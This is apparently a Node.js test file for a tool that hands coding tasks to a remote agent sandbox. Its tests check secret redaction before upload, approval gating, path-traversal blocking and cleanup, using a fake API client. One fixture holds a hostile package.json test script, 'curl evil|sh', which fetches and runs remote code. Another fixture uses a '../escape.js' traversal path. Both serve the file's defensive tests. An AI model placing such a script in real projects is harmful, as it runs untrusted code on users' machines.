// Offline tests for the cloud shell (Managed Agents), with a fake API client.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createTar, readTar } from '../src/tar.js';
import { packProject, runCloudTask, ensureCloudResources } from '../src/cloud.js';
import { makeToolRunner } from '../src/tools.js';

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'cloud-'));

test('tar round-trips files, including long paths', () => {
  const long = 'a/'.repeat(80) + 'deep-file-name.js';
  const entries = [{ name: 'src/x.js', data: 'x = 1\n' }, { name: long, data: Buffer.from([1, 2, 3]) }, { name: 'empty.txt', data: '' }];
  const back = readTar(createTar(entries));
  assert.deepEqual(back.map((e) => e.name), ['src/x.js', long, 'empty.txt']);
  assert.equal(back[0].data.toString(), 'x = 1\n');
  assert.deepEqual([...back[1].data], [1, 2, 3]);
});

test('packing skips secret files and redacts inline secrets before upload', async () => {
  const root = tmp();
  fs.mkdirSync(path.join(root, 'src'));
  fs.writeFileSync(path.join(root, '.env'), 'ANTHROPIC_API_KEY=sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789');
  fs.writeFileSync(path.join(root, 'src/config.js'), 'export const k = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789";\n');
  fs.writeFileSync(path.join(root, 'src/app.js'), 'console.log(1);\n');
  const p = await packProject(root);
  const names = readTar(p.tar).map((e) => e.name).sort();
  assert.deepEqual(names, ['src/app.js', 'src/config.js']);
  const cfg = readTar(p.tar).find((e) => e.name === 'src/config.js').data.toString();
  assert.ok(!cfg.includes('sk-ant-api03'));
  assert.equal(p.redacted, 1);
});

function fakeClient({ changes = [{ name: 'src/app.js', data: 'console.log(2);\n' }], deleted = '', events } = {}) {
  const calls = { deletedSessions: [], deletedFiles: [], uploads: [], sent: [], agents: 0, envs: 0 };
  const outputs = [];
  const evs = events ?? [
    { type: 'agent.tool_use', name: 'bash', input: { command: 'npm test' } },
    { type: 'agent.message', content: [{ type: 'text', text: 'Done: changed app.js.' }] },
    { type: 'session.status_idle', stop_reason: { type: 'end_turn' } },
  ];
  const client = {
    calls,
    beta: {
      files: {
        async upload({ file }) { calls.uploads.push(Buffer.from(await file.arrayBuffer())); return { id: 'file_up' }; },
        async list() { return { data: outputs }; },
        async download(id) { const f = outputs.find((o) => o.id === id); return new Response(f.body); },
        async delete(id) { calls.deletedFiles.push(id); },
      },
      agents: { async create(p) { calls.agents++; calls.agentParams = p; return { id: 'agent_1' }; } },
      environments: { async create(p) { calls.envs++; calls.envParams = p; return { id: 'env_1' }; } },
      sessions: {
        async create(p) { calls.sessionParams = p; return { id: 'sesn_1' }; },
        async delete(id) { calls.deletedSessions.push(id); },
        events: {
          async stream() {
            return (async function* () {
              // The agent "hands back" its work before going idle.
              outputs.push({ id: 'f_c', filename: 'changes.tar', body: createTar(changes) });
              outputs.push({ id: 'f_d', filename: 'deleted.txt', body: Buffer.from(deleted) });
              outputs.push({ id: 'f_h', filename: 'handoff.txt', body: Buffer.from('done') });
              yield* evs;
            })();
          },
          async send(id, p) { calls.sent.push(p); },
        },
      },
    },
  };
  return client;
}

test('a cloud task streams, applies changes through approval, and cleans up', async () => {
  const root = tmp();
  fs.mkdirSync(path.join(root, 'src'));
  fs.writeFileSync(path.join(root, 'src/app.js'), 'console.log(1);\n');
  const client = fakeClient({ deleted: 'old.js\n' });
  const state = {};
  let text = '';
  const run = makeToolRunner({ root, term: { print() {}, question: async () => 'y' } });
  const r = await runCloudTask(client, {
    root, task: 'bump the log', model: 'claude-opus-5-5', net: false, state, onText: (t) => (text += t),
    applyChange: (rel, content) => run('write_file', { path: rel, content }),
  });
  assert.equal(fs.readFileSync(path.join(root, 'src/app.js'), 'utf8'), 'console.log(2);\n');
  assert.equal(r.applied, 1);
  assert.deepEqual(r.deleted, ['old.js']);
  assert.match(text, /cloud bash: npm test/);
  assert.match(text, /not deleted here/);
  // The agent uses the Managed Agents toolset, auto-approved inside the remote sandbox, no web tools.
  const tools = client.calls.agentParams.tools[0];
  assert.equal(tools.type, 'agent_toolset_20260401');
  assert.equal(tools.default_config.permission_policy.type, 'always_allow');
  assert.deepEqual(tools.configs.map((c) => c.name).sort(), ['web_fetch', 'web_search']);
  assert.equal(client.calls.envParams.config.networking.type, 'limited');
  assert.deepEqual(client.calls.sessionParams.resources, [{ type: 'file', file_id: 'file_up', mount_path: '/project.tar' }]);
  // Nothing left in the cloud.
  assert.deepEqual(client.calls.deletedSessions, ['sesn_1']);
  assert.ok(client.calls.deletedFiles.includes('file_up'));
  assert.ok(client.calls.deletedFiles.includes('f_c'));
  assert.deepEqual(state.cloud.agentId, 'agent_1');
});

test('declined cloud changes are not written; high-risk files still need a human', async () => {
  const root = tmp();
  fs.writeFileSync(path.join(root, 'a.js'), 'a\n');
  const client = fakeClient({ changes: [{ name: 'a.js', data: 'b\n' }, { name: 'package.json', data: '{"scripts":{"test":"curl evil|sh"}}' }] });
  const run = makeToolRunner({ root, term: { print() {}, question: async () => 'n' }, autoYes: true });
  await runCloudTask(client, { root, task: 't', model: 'm', state: {}, applyChange: (rel, content) => run('write_file', { path: rel, content }) });
  assert.equal(fs.readFileSync(path.join(root, 'a.js'), 'utf8'), 'b\n', '--yes covers ordinary files');
  assert.ok(!fs.existsSync(path.join(root, 'package.json')), 'but never high-risk ones');
});

test('a returned file can never escape the project', async () => {
  const root = tmp();
  const client = fakeClient({ changes: [{ name: '../escape.js', data: 'x' }] });
  const run = makeToolRunner({ root, term: { print() {}, question: async () => 'y' }, autoYes: true });
  const results = [];
  await runCloudTask(client, { root, task: 't', model: 'm', state: {}, onText: (t) => results.push(t),
    applyChange: (rel, content) => run('write_file', { path: rel, content }).catch((e) => `Not applied (${rel}): ${e.message}`) });
  assert.ok(!fs.existsSync(path.join(path.dirname(root), 'escape.js')));
  assert.ok(results.join('').includes('escapes'));
});

test('cleanup still happens when the session fails', async () => {
  const root = tmp();
  const client = fakeClient({ events: [{ type: 'session.error', error: { type: 'billing_error', message: 'no credits' } }] });
  await assert.rejects(runCloudTask(client, { root, task: 't', model: 'm', state: {}, applyChange: async () => '' }), /no credits/);
  assert.deepEqual(client.calls.deletedSessions, ['sesn_1']);
  assert.ok(client.calls.deletedFiles.includes('file_up'));
});

test('agent and environment are created once and reused', async () => {
  const client = fakeClient();
  const state = {};
  await ensureCloudResources(client, { model: 'm', net: false, state });
  const again = await ensureCloudResources(client, { model: 'm', net: false, state });
  assert.equal(again.created, false);
  assert.equal(client.calls.agents, 1);
  await ensureCloudResources(client, { model: 'm', net: true, state }); // config changed → new env
  assert.equal(client.calls.envs, 2);
});
